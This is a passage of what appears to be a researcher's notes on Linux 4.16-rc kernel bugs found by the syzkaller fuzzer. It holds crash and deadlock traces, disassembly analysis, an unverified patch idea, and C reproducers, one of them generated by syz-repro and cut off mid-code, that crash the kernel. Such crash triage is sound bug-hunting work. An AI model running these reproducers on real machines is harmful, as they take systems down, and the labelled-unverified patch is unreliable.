\r\n\r\n#include <sys/mman.h>\r\n#include <sys/socket.h>\r\n#include <sys/syscall.h>\r\n\r\nint main() {\r\n\tint size = 4;\r\n\tvoid *p = (void *)0;\r\n\r\n\tint s = socket(0xa, 2, 0);           // socket@inet6_udp\r\n\tgetsockopt(s, 0x29, 0x50, p, &size); // getsockopt@inet6_int\r\n\r\n\treturn 0;\r\n}\r\n```\r\n\r\n## fifo_open - possible circular locking (leading to deadlock)\r\n\r\n### Call Trace (Dump)\r\n\r\n```c\r\nWARNING: possible circular locking dependency detected\r\n4.16.0-rc1+ #15 Not tainted\r\n------------------------------------------------------\r\nsyz-executor4/30664 is trying to acquire lock:\r\n (&pipe->mutex/1){+.+.}, at: [<00000000c69506f3>] __pipe_lock fs/pipe.c:83 [inline]\r\n (&pipe->mutex/1){+.+.}, at: [<00000000c69506f3>] fifo_open+0x77/0x3c0 fs/pipe.c:921\r\n\r\nbut task is already holding lock:\r\n (&sig->cred_guard_mutex){+.+.}, at: [<00000000a7717ddc>] prepare_bprm_creds+0x2a/0x80 fs/exec.c:1389\r\n\r\nwhich lock already depends on the new lock.\r\n\r\n\r\nthe existing dependency chain (in reverse order) is:\r\n\r\n-> #2 (&sig->cred_guard_mutex){+.+.}:\r\n       lock_trace+0x1f/0x70 fs/proc/base.c:408\r\n       proc_pid_stack+0x73/0x120 fs/proc/base.c:444\r\n       proc_single_show+0x4d/0x80 fs/proc/base.c:747\r\n       seq_read+0x10f/0x560 fs/seq_file.c:237\r\n       __vfs_read+0x50/0x1d0 fs/read_write.c:411\r\n       vfs_read+0xc0/0x1a0 fs/read_write.c:447\r\n       SYSC_read fs/read_write.c:573 [inline]\r\n       SyS_read+0x60/0xe0 fs/read_write.c:566\r\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\r\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\r\n\r\n-> #1 (&p->lock){+.+.}:\r\n       seq_read+0x51/0x560 fs/seq_file.c:165\r\n       do_loop_readv_writev fs/read_write.c:673 [inline]\r\n       do_iter_read+0x19f/0x1f0 fs/read_write.c:897\r\n       vfs_readv+0x96/0xe0 fs/read_write.c:959\r\n       kernel_readv fs/splice.c:361 [inline]\r\n       default_file_splice_read+0x241/0x3e0 fs/splice.c:416\r\n       do_splice_to+0x8c/0xc0 fs/splice.c:880\r\n       do_splice fs/splice.c:1173 [inline]\r\n       SYSC_splice fs/splice.c:1402 [inline]\r\n       SyS_splice+0x7ba/0x820 fs/splice.c:1382\r\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\r\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\r\n\r\n-> #0 (&pipe->mutex/1){+.+.}:\r\n       __mutex_lock_common kernel/locking/mutex.c:756 [inline]\r\n       __mutex_lock+0x7a/0x9f0 kernel/locking/mutex.c:893\r\n       __pipe_lock fs/pipe.c:83 [inline]\r\n       fifo_open+0x77/0x3c0 fs/pipe.c:921\r\n       do_dentry_open+0x276/0x400 fs/open.c:752\r\n       vfs_open+0x5d/0xb0 fs/open.c:866\r\n       do_last fs/namei.c:3378 [inline]\r\n       path_openat+0x25b/0x1040 fs/namei.c:3518\r\n       do_filp_open+0xb9/0x150 fs/namei.c:3553\r\n       do_open_execat+0xa6/0x200 fs/exec.c:849\r\n       do_execveat_common.isra.32+0x33d/0xbb0 fs/exec.c:1740\r\n       do_execve fs/exec.c:1847 [inline]\r\n       SYSC_execve fs/exec.c:1928 [inline]\r\n       SyS_execve+0x34/0x40 fs/exec.c:1923\r\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\r\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\r\n\r\nother info that might help us debug this:\r\n\r\nChain exists of:\r\n  &pipe->mutex/1 --> &p->lock --> &sig->cred_guard_mutex\r\n\r\n Possible unsafe locking scenario:\r\n\r\n       CPU0                    CPU1\r\n       ----                    ----\r\n  lock(&sig->cred_guard_mutex);\r\n                               lock(&p->lock);\r\n                               lock(&sig->cred_guard_mutex);\r\n  lock(&pipe->mutex/1);\r\n\r\n *** DEADLOCK ***\r\n```\r\n\r\nSkip the Call Trace (Stack backtrace).\r\n\r\n## seq_read - possible circular locking (leading to deadlock)\r\n\r\n### Call Trace (Dump)\r\n\r\n```c\r\nWARNING: possible circular locking dependency detected\r\n4.16.0-rc1+ #15 Not tainted\r\n------------------------------------------------------\r\nsyz-executor2/10621 is trying to acquire lock:\r\n (&p->lock){+.+.}, at: [<00000000dad12130>] seq_read+0x51/0x560 fs/seq_file.c:165\r\n\r\nbut task is already holding lock:\r\n (&pipe->mutex/1){+.+.}, at: [<000000009e27b116>] pipe_lock_nested fs/pipe.c:62 [inline]\r\n (&pipe->mutex/1){+.+.}, at: [<000000009e27b116>] pipe_lock+0x25/0x30 fs/pipe.c:70\r\n\r\nwhich lock already depends on the new lock.\r\n\r\n\r\nthe existing dependency chain (in reverse order) is:\r\n\r\n-> #2 (&pipe->mutex/1){+.+.}:\r\n       __pipe_lock fs/pipe.c:83 [inline]\r\n       fifo_open+0x77/0x3c0 fs/pipe.c:921\r\n       do_dentry_open+0x276/0x400 fs/open.c:752\r\n       vfs_open+0x5d/0xb0 fs/open.c:866\r\n       do_last fs/namei.c:3378 [inline]\r\n       path_openat+0x25b/0x1040 fs/namei.c:3518\r\n       do_filp_open+0xb9/0x150 fs/namei.c:3553\r\n       do_open_execat+0xa6/0x200 fs/exec.c:849\r\n       do_execveat_common.isra.32+0x33d/0xbb0 fs/exec.c:1740\r\n       do_execve fs/exec.c:1847 [inline]\r\n       SYSC_execve fs/exec.c:1928 [inline]\r\n       SyS_execve+0x34/0x40 fs/exec.c:1923\r\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\r\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\r\n\r\n-> #1 (&sig->cred_guard_mutex){+.+.}:\r\n       lock_trace+0x1f/0x70 fs/proc/base.c:408\r\n       proc_pid_stack+0x73/0x120 fs/proc/base.c:444\r\n       proc_single_show+0x4d/0x80 fs/proc/base.c:747\r\n       seq_read+0x10f/0x560 fs/seq_file.c:237\r\n       __vfs_read+0x50/0x1d0 fs/read_write.c:411\r\n       vfs_read+0xc0/0x1a0 fs/read_write.c:447\r\n       SYSC_read fs/read_write.c:573 [inline]\r\n       SyS_read+0x60/0xe0 fs/read_write.c:566\r\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\r\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\r\n\r\n-> #0 (&p->lock){+.+.}:\r\n       __mutex_lock_common kernel/locking/mutex.c:756 [inline]\r\n       __mutex_lock+0x7a/0x9f0 kernel/locking/mutex.c:893\r\n       seq_read+0x51/0x560 fs/seq_file.c:165\r\n       proc_reg_read+0x65/0xc0 fs/proc/inode.c:218\r\n       do_loop_readv_writev fs/read_write.c:673 [inline]\r\n       do_iter_read+0x19f/0x1f0 fs/read_write.c:897\r\n       vfs_readv+0x96/0xe0 fs/read_write.c:959\r\n       kernel_readv fs/splice.c:361 [inline]\r\n       default_file_splice_read+0x241/0x3e0 fs/splice.c:416\r\n       do_splice_to+0x8c/0xc0 fs/splice.c:880\r\n       do_splice fs/splice.c:1173 [inline]\r\n       SYSC_splice fs/splice.c:1402 [inline]\r\n       SyS_splice+0x7ba/0x820 fs/splice.c:1382\r\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\r\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\r\n\r\nother info that might help us debug this:\r\n\r\nChain exists of:\r\n  &p->lock --> &sig->cred_guard_mutex --> &pipe->mutex/1\r\n\r\n Possible unsafe locking scenario:\r\n\r\n       CPU0                    CPU1\r\n       ----                    ----\r\n  lock(&pipe->mutex/1);\r\n                               lock(&sig->cred_guard_mutex);\r\n                               lock(&pipe->mutex/1);\r\n  lock(&p->lock);\r\n\r\n *** DEADLOCK ***\r\n```\r\n\r\nSkip the Call Trace (Stack backtrace).\r\n\r\n## pfifo_fast_enqueue - unable to handle kernel paging request\r\n\r\nI just got this bug from syzkaller today on LK v4.16.0-rc1.\r\n\r\n### Call Trace (Dump)\r\n\r\n```c\r\nIP: qdisc_qstats_cpu_qlen_inc include/net/sch_generic.h:717 [inline]\r\nIP: pfifo_fast_enqueue+0xce/0x130 net/sched/sch_generic.c:638\r\nPGD 5f758067 P4D 5f758067 PUD 5f759067 PMD 7fa34067 PTE 800000003a9f7060\r\nOops: 0000 [#1] SMP DEBUG_PAGEALLOC PTI\r\nDumping ftrace buffer:\r\n   (ftrace buffer empty)\r\nModules linked in:\r\nCPU: 0 PID: 2766 Comm: syz-fuzzer Not tainted 4.16.0-rc1+ #17\r\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014\r\nRIP: 0010:qdisc_qstats_cpu_qlen_inc include/net/sch_generic.h:717 [inline]\r\nRIP: 0010:pfifo_fast_enqueue+0xce/0x130 net/sched/sch_generic.c:638\r\nRSP: 0018:ffffb1ffc13df8e8 EFLAGS: 00010207\r\nRAX: 0000472b4040eaa4 RBX: 0000000000000000 RCX: ffffffff8af3a141\r\nRDX: 0000000000000000 RSI: 0000000000000005 RDI: ffff8ad479d17b08\r\nRBP: ffff8ad479d178c0 R08: 0000000000000000 R09: 0000000000000000\r\nR10: ffffb1ffc13df868 R11: 5aaeccbc2ff5acd1 R12: ffff8ad479d17800\r\nR13: ffff8ad43a9f7f00 R14: ffff8ad479d17b08 R15: ffffb1ffc13df958\r\nFS:  00007ff075d99700(0000) GS:ffff8ad43fc00000(0000) knlGS:0000000000000000\r\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\r\nCR2: ffff8ad43a9f7f28 CR3: 000000007a882000 CR4: 00000000000006f0\r\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\r\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\r\nCall Trace:\r\n __dev_xmit_skb net/core/dev.c:3209 [inline]\r\n __dev_queue_xmit+0x331/0xd80 net/core/dev.c:3510\r\n neigh_hh_output include/net/neighbour.h:472 [inline]\r\n neigh_output include/net/neighbour.h:480 [inline]\r\n ip_finish_output2+0x5d8/0x7d0 net/ipv4/ip_output.c:229\r\n ip_finish_output+0x246/0x3d0 net/ipv4/ip_output.c:317\r\n NF_HOOK_COND include/linux/netfilter.h:277 [inline]\r\n ip_output+0x8a/0x2e0 net/ipv4/ip_output.c:405\r\n dst_output include/net/dst.h:443 [inline]\r\n ip_local_out+0x4e/0xa0 net/ipv4/ip_output.c:124\r\n ip_queue_xmit+0x289/0x760 net/ipv4/ip_output.c:504\r\n tcp_transmit_skb+0x645/0xd60 net/ipv4/tcp_output.c:1176\r\n tcp_send_ack.part.42+0xd4/0x160 net/ipv4/tcp_output.c:3619\r\n tcp_send_ack+0x1e/0x30 net/ipv4/tcp_output.c:3589\r\n tcp_cleanup_rbuf+0x88/0x180 net/ipv4/tcp.c:1605\r\n tcp_recvmsg+0x45c/0xf00 net/ipv4/tcp.c:2022\r\n inet_recvmsg+0x78/0x270 net/ipv4/af_inet.c:796\r\n sock_recvmsg_nosec net/socket.c:803 [inline]\r\n sock_recvmsg+0x47/0x60 net/socket.c:810\r\n sock_read_iter+0xb2/0x120 net/socket.c:887\r\n call_read_iter include/linux/fs.h:1775 [inline]\r\n new_sync_read fs/read_write.c:401 [inline]\r\n __vfs_read+0x169/0x1d0 fs/read_write.c:413\r\n vfs_read+0xc0/0x1a0 fs/read_write.c:447\r\n SYSC_read fs/read_write.c:573 [inline]\r\n SyS_read+0x60/0xe0 fs/read_write.c:566\r\n do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\r\n entry_SYSCALL_64_after_hwframe+0x26/0x9b\r\nRIP: 0033:0x488864\r\nRSP: 002b:000000c4204a99a8 EFLAGS: 00000246 ORIG_RAX: 0000000000000000\r\nRAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000488864\r\nRDX: 0000000000001000 RSI: 000000c4203c1000 RDI: 0000000000000003\r\nRBP: 000000c4204a99f8 R08: 0000000000000000 R09: 0000000000000000\r\nR10: 0000000000000000 R11: 0000000000000246 R12: 000000c425859aa0\r\nR13: 0000000000000001 R14: 000000c42449b260 R15: 0000000000000000\r\nCode: 00 00 39 83 40 02 00 00 7d 67 e8 7e 48 63 ff 4c 89 f7 e8 46 2f 37 00 31 db e8 6f 48 63 ff 49 8b 44 24 58 65 ff 00 49 8b 44 24 58 <41> 8b 55 28 65 01 50 04 e8 55 48 63 ff 89 d8 5b 5d 41 5c 41 5d \r\nRIP: qdisc_qstats_cpu_qlen_inc include/net/sch_generic.h:717 [inline] RSP: ffffb1ffc13df8e8\r\nRIP: pfifo_fast_enqueue+0xce/0x130 net/sched/sch_generic.c:638 RSP: ffffb1ffc13df8e8\r\nCR2: ffff8ad43a9f7f28\r\n---[ end trace a3bf459ad1c9376d ]---\r\n```\r\n\r\nRIP is pointing at pfifo_fast_enqueue.\r\n\r\n### Bug\r\n\r\n```c\r\nstatic int pfifo_fast_enqueue(struct sk_buff *skb, struct Qdisc *qdisc,\r\n\t\t\t      struct sk_buff **to_free)\r\n{\r\n\tint band = prio2band[skb->priority & TC_PRIO_MAX];\r\n\tstruct pfifo_fast_priv *priv = qdisc_priv(qdisc);\r\n\tstruct skb_array *q = band2list(priv, band);\r\n\tint err;\r\n\r\n\terr = skb_array_produce(q, skb);\r\n\r\n\tif (unlikely(err))\r\n\t\treturn qdisc_drop_cpu(skb, qdisc, to_free);\r\n\r\n\tqdisc_qstats_cpu_qlen_inc(qdisc);\r\n\tqdisc_qstats_cpu_backlog_inc(qdisc, skb);\r\n\treturn NET_XMIT_SUCCESS;\r\n}\r\n\r\nstatic inline void qdisc_qstats_cpu_qlen_inc(struct Qdisc *sch)\r\n{\r\n\tthis_cpu_inc(sch->cpu_qstats->qlen); // equals to this_cpu_add(sch->cpu_qstats->qlen, 1);\r\n}\r\n\r\nstatic inline void qdisc_qstats_cpu_backlog_inc(struct Qdisc *sch,\r\n\t\t\t\t\t\tconst struct sk_buff *skb)\r\n{\r\n\tthis_cpu_add(sch->cpu_qstats->backlog, qdisc_pkt_len(skb));\r\n}\r\n\r\n```\r\n\r\n```c\r\n   0:   00 00                   add    BYTE PTR [rax],al\r\n   2:   39 83 40 02 00 00       cmp    DWORD PTR [rbx+0x240],eax ; unlikely(err)\r\n   8:   7d 67                   jge    0x71 ; maybe errout\r\n   a:   e8 7e 48 63 ff          call   0xffffffffff63488d ; this_cpu_add\r\n   f:   4c 89 f7                mov    rdi,r14\r\n  12:   e8 46 2f 37 00          call   0x372f5d\r\n  17:   31 db                   xor    ebx,ebx ; ebx = 0\r\n  19:   e8 6f 48 63 ff          call   0xffffffffff63488d ; this_cpu_add\r\n  1e:   49 8b 44 24 58          mov    rax,QWORD PTR [r12+0x58]\r\n  23:   65 ff 00                inc    DWORD PTR gs:[rax] ; sch->cpu_qstats->qlen, increased by 1\r\n  26:   49 8b 44 24 58          mov    rax,QWORD PTR [r12+0x58] ; qdisc\r\n  2b:  *41 8b 55 28             mov    edx,DWORD PTR [r13+0x28] ; skb\r\n  2f:   65 01 50 04             add    DWORD PTR gs:[rax+0x4],edx\r\n  33:   e8 55 48 63 ff          call   0xffffffffff63488d ; this_cpu_add\r\n  38:   89 d8                   mov    eax,ebx ; eax = ebx (eax = 0)\r\n  3a:   5b                      pop    rbx\r\n  3b:   5d                      pop    rbp\r\n  3c:   41 5c                   pop    r12\r\n  3e:   41 5d                   pop    r13\r\n```\r\n\r\nGenerously, 'Unable to handle kernel paging request' bug happened when bad type-casting or invalid pointer exist.\r\n\r\nAt 0x2b, there is a crash point. Meaning that accessing [r13+0x28] is violated.  Let's have a look.\r\n\r\nWith above Crash Dump, we can notice **r13** is 0x1. At result, in that case, accessing at 0x29 where a invalid page is currently, getting value from there and moving into edx (skb).\r\n\r\nSo the bug is happened by above reason.\r\n\r\nThen, why 'r13' is corrupted? Well... digging up more with reproducible PoC and then maybe there's a clear result :).\r\n\r\n### Solution\r\n\r\nMaybe, more strict pointer validation is needed at qdisc & skb. Here's my suggested patch PoC code. (not verified).\r\n\r\n```c\r\nstatic int pfifo_fast_enqueue(struct sk_buff *skb, struct Qdisc *qdisc,\r\n\t\t\t      struct sk_buff **to_free)\r\n{\r\n\tint band = prio2band[skb->priority & TC_PRIO_MAX];\r\n\tstruct pfifo_fast_priv *priv = qdisc_priv(qdisc);\r\n\tstruct skb_array *q = band2list(priv, band);\r\n\tint err;\r\n\r\n\terr = skb_array_produce(q, skb);\r\n\r\n\tif (unlikely(err))\r\n\t\treturn qdisc_drop_cpu(skb, qdisc, to_free);\r\n\t\t\r\n\tif (!qdisc) // qdisc validation\r\n\t    return sth;\r\n\t\r\n\tqdisc_qstats_cpu_qlen_inc(qdisc);\r\n\tqdisc_qstats_cpu_backlog_inc(qdisc, skb);\r\n\treturn NET_XMIT_SUCCESS;\r\n}\r\n```\r\n\r\n## tick_sched_time/handle - alloca Out Of Bounds\r\n\r\nGot from syzkaller & Found in LK v4.16.0-rc2~.\r\n\r\n### Call Trace (Dump)\r\n\r\n```c\r\nBUG: KASAN: alloca-out-of-bounds in tick_sched_handle+0x165/0x180\r\nRead of size 8 at addr ffff880022ba7030 by task syz-executor5/3160\r\n\r\nCPU: 0 PID: 3160 Comm: syz-executor5 Not tainted 4.16.0-rc2+ #2\r\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\r\nCall Trace:\r\n <IRQ>\r\n dump_stack+0x127/0x213\r\n print_address_description+0x60/0x22b\r\n kasan_report.cold.6+0xac/0x2f4\r\n </IRQ>\r\n\r\nThe buggy address belongs to the page:\r\npage:ffffea00008ae9c0 count:0 mapcount:0 mapping:          (null) index:0x0\r\nflags: 0x100000000000000()\r\nraw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff\r\nraw: 0000000000000000 ffffea00008ae9e0 0000000000000000 0000000000000000\r\npage dumped because: kasan: bad access detected\r\n\r\nMemory state around the buggy address:\r\n ffff880022ba6f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n ffff880022ba6f80: 00 00 00 00 00 00 00 00 00 00 00 00 ca ca ca ca\r\n>ffff880022ba7000: 02 cb cb cb cb cb cb cb 00 00 00 00 00 00 00 00\r\n                                     ^\r\n ffff880022ba7080: 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1\r\n ffff880022ba7100: f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00 f2 f2 f2 f2\r\n==================================================================\r\nKernel panic - not syncing: panic_on_warn set ...\r\n\r\nCPU: 0 PID: 3160 Comm: syz-executor5 Tainted: G    B            4.16.0-rc2+ #2\r\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\r\nCall Trace:\r\n <IRQ>\r\n dump_stack+0x127/0x213\r\n panic+0x1f8/0x46f\r\n kasan_end_report+0x43/0x49\r\n kasan_report.cold.6+0xc8/0x2f4\r\n </IRQ>\r\nDumping ftrace buffer:\r\n   (ftrace buffer empty)\r\nKernel Offset: 0x8e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\r\nRebooting in 86400 seconds..\r\n2018/02/24 05:33:21 reproducing crash 'KASAN: alloca-out-of-bounds Read in tick_sched_handle': final repro crashed as (corrupted=false):\r\n==================================================================\r\nBUG: KASAN: alloca-out-of-bounds in tick_sched_handle+0x165/0x180\r\nRead of size 8 at addr ffff880022ba7030 by task syz-executor5/3160\r\n\r\nCPU: 0 PID: 3160 Comm: syz-executor5 Not tainted 4.16.0-rc2+ #2\r\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\r\nCall Trace:\r\n <IRQ>\r\n dump_stack+0x127/0x213\r\n print_address_description+0x60/0x22b\r\n kasan_report.cold.6+0xac/0x2f4\r\n </IRQ>\r\n\r\nThe buggy address belongs to the page:\r\npage:ffffea00008ae9c0 count:0 mapcount:0 mapping:          (null) index:0x0\r\nflags: 0x100000000000000()\r\nraw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff\r\nraw: 0000000000000000 ffffea00008ae9e0 0000000000000000 0000000000000000\r\npage dumped because: kasan: bad access detected\r\n\r\nMemory state around the buggy address:\r\n ffff880022ba6f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n ffff880022ba6f80: 00 00 00 00 00 00 00 00 00 00 00 00 ca ca ca ca\r\n>ffff880022ba7000: 02 cb cb cb cb cb cb cb 00 00 00 00 00 00 00 00\r\n                                     ^\r\n ffff880022ba7080: 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1\r\n ffff880022ba7100: f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00 f2 f2 f2 f2\r\n==================================================================\r\nKernel panic - not syncing: panic_on_warn set ...\r\n\r\nCPU: 0 PID: 3160 Comm: syz-executor5 Tainted: G    B            4.16.0-rc2+ #2\r\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\r\nCall Trace:\r\n <IRQ>\r\n dump_stack+0x127/0x213\r\n panic+0x1f8/0x46f\r\n kasan_end_report+0x43/0x49\r\n kasan_report.cold.6+0xc8/0x2f4\r\n </IRQ>\r\nDumping ftrace buffer:\r\n   (ftrace buffer empty)\r\nKernel Offset: 0x8e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\r\nRebooting in 86400 seconds..\r\n```\r\n\r\n### PoC\r\n\r\ngenerated by syz-repro.\r\n\r\n```c\r\n#define _GNU_SOURCE\r\n\r\n#include <endian.h>\r\n#include <sys/syscall.h>\r\n#include <unistd.h>\r\n#include <errno.h>\r\n#include <signal.h>\r\n#include <stdarg.h>\r\n#include <stdio.h>\r\n#include <sys/time.h>\r\n#include <sys/wait.h>\r\n#include <time.h>\r\n#include <sys/prctl.h>\r\n#include <dirent.h>\r\n#include <sys/mount.h>\r\n#include <arpa/inet.h>\r\n#include <errno.h>\r\n#include <fcntl.h>\r\n#include <linux/if.h>\r\n#include <linux/if_ether.h>\r\n#include <linux/if_tun.h>\r\n#include <linux/ip.h>\r\n#include <linux/tcp.h>\r\n#include <net/if_arp.h>\r\n#include <stdarg.h>\r\n#include <stdbool.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <sys/ioctl.h>\r\n#include <sys/stat.h>\r\n#include <sys/uio.h>\r\n#include <linux/net.h>\r\n#include <netinet/in.h>\r\n#include <sys/socket.h>\r\n#include <fcntl.h>\r\n#include <stdio.h>\r\n#include <sys/ioctl.h>\r\n#include <sys/stat.h>\r\n\r\n__attribute__((noreturn)) static void doexit(int status)\r\n{\r\n\tvolatile unsigned i;\r\n\tsyscall(__NR_exit_group, status);\r\n\tfor (i = 0;; i++) {\r\n\t}\r\n}\r\n#include <stdint.h>\r\n#include <string.h>\r\n#include <errno.h>\r\n#include <stdarg.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <sys/stat.h>\r\n\r\nconst int kFailStatus = 67;\r\nconst int kRetryStatus = 69;\r\n\r\n  static void fail(const char* msg, ...)\r\n{\r\n\tint e = errno;\r\n\tva_list args;\r\n\tva_start(args, msg);\r\n\tvfprintf(stderr, msg, args);\r\n\tva_end(args);\r\n\tfprintf(stderr, \" (errno %d)\\n\", e);\r\n\tdoexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);\r\n}\r\n\r\n  static void exitf(const char* msg, ...)\r\n{\r\n\tint e = errno;\r\n\tva_list args;\r\n\tva_start(args, msg);\r\n\tvfprintf(stderr, msg, args);\r\n\tva_end(args);\r\n\tfprintf(stderr, \" (errno %d)\\n\", e);\r\n\tdoexit(kRetryStatus);\r\n}\r\n\r\nstatic uint64_t current_time_ms()\r\n{\r\n\tstruct timespec ts;\r\n\r\n\tif (clock_gettime(CLOCK_MONOTONIC, &ts))\r\n\t\tfail(\"clock_gettime failed\");\r\n\treturn (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;\r\n}\r\n\r\nstatic void use_temporary_dir()\r\n{\r\n\tchar tmpdir_template[] = \"./syzkaller.XXXXXX\";\r\n\tchar* tmpdir = mkdtemp(tmpdir_template);\r\n\tif (!tmpdir)\r\n\t\tfail(\"failed to mkdtemp\");\r\n\tif (chmod(tmpdir, 0777))\r\n\t\tfail(\"failed to chmod\");\r\n\tif (chdir(tmpdir))\r\n\t\tfail(\"failed to chdir\");\r\n}\r\n\r\nstatic void vsnprintf_check(char* str, size_t size, const char* format, va_list args)\r\n{\r\n\tint rv;\r\n\r\n\trv = vsnprintf(str, size, format, args);\r\n\tif (rv < 0)\r\n\t\tfail(\"tun: snprintf failed\");\r\n\tif ((size_t)rv >= size)\r\n\t\tfail(\"tun: string '%s...' doesn't fit into buffer\", str);\r\n}\r\n\r\nstatic void snprintf_check(char* str, size_t size, const char* format, ...)\r\n{\r\n\tva_list args;\r\n\r\n\tva_start(args, format);\r\n\tvsnprintf_check(str, size, format, args);\r\n\tva_end(args);\r\n}\r\n\r\n#define COMMAND_MAX_LEN 128\r\n#define PATH_PREFIX \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \"\r\n#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)\r\n\r\nstatic void execute_command(bool panic, const char* format, ...)\r\n{\r\n\tva_list args;\r\n\tchar command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];\r\n\tint rv;\r\n\r\n\tva_start(args, format);\r\n\tmemcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);\r\n\tvsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);\r\n\trv = system(command);\r\n\tif (panic && rv != 0)\r\n\t\tfail(\"tun: command \\\"%s\\\" failed with code %d\", &command[0], rv);\r\n\r\n\tva_end(args);\r\n}\r\n\r\nstatic int tunfd = -1;\r\nstatic int tun_frags_enabled;\r\n\r\n#define SYZ_TUN_MAX_PACKET_SIZE 1000\r\n\r\n#define TUN_IFACE \"syz_tun\"\r\n\r\n#define LOCAL_MAC \"aa:aa:aa:aa:aa:aa\"\r\n#define REMOTE_MAC \"aa:aa:aa:aa:aa:bb\"\r\n\r\n#define LOCAL_IPV4 \"172.20.20.170\"\r\n#define REMOTE_IPV4 \"172.20.20.187\"\r\n\r\n#define LOCAL_IPV6 \"fe80::aa\"\r\n#define REMOTE_IPV6 \"fe80::bb\"\r\n\r\n#define IFF_NAPI 0x0010\r\n#define IFF_NAPI_FRAGS 0x0020\r\n\r\nstatic void initialize_tun(void)\r\n{\r\n\ttunfd = open(\"/dev/net/tun\", O_RDWR | O_NONBLOCK);\r\n\tif (tunfd == -1) {\r\n\t\tprintf(\"tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\\n\");\r\n\t\tprintf(\"otherwise fuzzing or reproducing might not work as intended\\n\");\r\n\t\treturn;\r\n\t}\r\n\tconst int kTunFd = 252;\r\n\tif (dup2(tunfd, kTunFd) < 0)\r\n\t\tfail(\"dup2(tunfd, kTunFd) failed\");\r\n\tclose(tunfd);\r\n\ttunfd = kTunFd;\r\n\r\n\tstruct ifreq ifr;\r\n\tmemset(&ifr, 0, sizeof(ifr));\r\n\tstrncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);\r\n\tifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;\r\n\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {\r\n\t\tifr.ifr_flags = IFF_TAP | IFF_NO_PI;\r\n\t\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)\r\n\t\t\tfail(\"tun: ioctl(TUNSETIFF) failed\");\r\n\t}\r\n\tif (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)\r\n\t\tfail(\"tun: ioctl(TUNGETIFF) failed\");\r\n\ttun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;\r\n\r\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.accept_dad=0\", TUN_IFACE);\r\n\r\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.router_solicitations=0\", TUN_IFACE);\r\n\r\n\texecute_command(1, \"ip link set dev %s address %s\", TUN_IFACE, LOCAL_MAC);\r\n\texecute_command(1, \"ip addr add %s/24 dev %s\", LOCAL_IPV4, TUN_IFACE);\r\n\texecute_command(1, \"ip -6 addr add %s/120 dev %s\", LOCAL_IPV6, TUN_IFACE);\r\n\texecute_command(1, \"ip neigh add %s lladdr %s dev %s nud permanent\",\r\n\t\t\tREMOTE_IPV4, REMOTE_MAC, TUN_IFACE);\r\n\texecute_command(1, \"ip -6 neigh add %s lladdr %s dev %s nud permanent\",\r\n\t\t\tREMOTE_IPV6, REMOTE_MAC, TUN_IFACE);\r\n\texecute_command(1, \"ip link set dev %s up\", TUN_IFACE);\r\n}\r\n\r\n#define DEV_IPV4 \"172.20.20.%d\"\r\n#define DEV_IPV6 \"fe80::%02hx\"\r\n#define DEV_MAC \"aa:aa:aa:aa:aa:%02hx\"\r\n\r\nstatic void initialize_netdevices(void)\r\n{\r\n\tunsigned i;\r\n\tconst char* devtypes[] = {\"ip6gretap\", \"bridge\", \"vcan\", \"bond\", \"veth\"};\r\n\tconst char* devnames[] = {\"lo\", \"sit0\", \"bridge0\", \"vcan0\", \"tunl0\",\r\n\t\t\t\t  \"gre0\", \"gretap0\", \"ip_vti0\", 